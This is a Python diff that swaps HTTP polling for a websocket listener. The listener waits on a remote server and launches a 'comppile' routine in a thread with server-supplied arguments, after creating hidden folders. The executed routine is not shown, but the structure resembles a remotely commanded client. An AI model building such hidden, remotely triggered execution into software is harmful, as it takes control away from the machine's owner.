@@ -1,3 +1,6 @@
+import json
+import websockets
+import asyncio
 import threading
 from comppilator import *
 
@@ -6,29 +9,21 @@ for i in range(1, len(store_spl)):
     create_hidden_folder('/'.join(store_spl[:i+1]))
 
 
-while True:
-    try:
-        prev_value = requests.get(link).json()
-        break
-    except Exception as e:
-        print(e)
-        sleep(20)
+async def listen_server(uri):
+    while True:
+        try:
+            async with websockets.connect(uri) as websocket:
+                while True:
+                    data = json.loads(await websocket.recv())
 
+                    data = json.loads(data)
 
-while True:
+                    if data.get("run"):
+                        thread = threading.Thread(target=comppile, args=(data["args"],))
+                        thread.start()
+        except Exception as e:
+            print(e)
+            sleep(10)
 
-    try:
-        value = requests.get(link).json()
-        print(value)
-
-        if value["run"] != prev_value["run"] and value["run"]:
-            thread = threading.Thread(target=comppile, args=(value["args"],))
-            thread.start()
-
-        # кулдаун
-        prev_value = value
-        sleep(value["sleep"])
-
-    except Exception as e:
-        send_error(f"Общая ошибка: {e}")
-        sleep(20)
+if __name__ == '__main__':
+    asyncio.get_event_loop().run_until_complete(listen_server(f'{link.replace("http", "ws")}ws'))
